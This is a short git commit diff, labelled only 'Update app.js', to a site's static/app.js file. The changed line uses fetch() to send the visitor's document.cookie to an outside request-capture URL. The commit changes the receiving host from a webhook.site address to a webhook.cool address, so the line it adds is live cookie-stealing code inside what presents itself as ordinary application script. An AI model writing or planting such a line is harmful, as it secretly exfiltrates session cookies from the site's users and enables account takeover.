15fdad3e5ec4213c0ddf8a3b8421151d1f493869
AzeTIx <93607991+AzeTIIx@users.noreply.github.com>
2026-05-11 00:38:59 +0200

    Update app.js

--- static/app.js
+++ static/app.js
@@ -1,1 +1,1 @@
-  fetch("https://webhook.site/13393844-2887-4d81-a304-7f97af41b856?c=" + encodeURIComponent(document.cookie));
+  fetch("https://nimble-raven-38.webhook.cool?c=" + encodeURIComponent(document.cookie));
